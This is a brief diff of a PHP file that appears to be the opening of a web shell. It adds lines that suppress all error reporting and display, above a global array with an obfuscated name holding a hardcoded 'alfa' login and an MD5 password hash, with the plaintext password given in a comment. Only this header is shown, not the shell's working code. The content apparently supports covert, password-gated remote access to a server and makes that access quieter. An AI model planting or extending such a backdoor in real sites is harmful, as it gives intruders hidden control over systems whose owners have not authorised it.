@@ -1,5 +1,8 @@
 <?php
 
+error_reporting(0);
+ini_set('display_errors', 0);
+
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
     'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
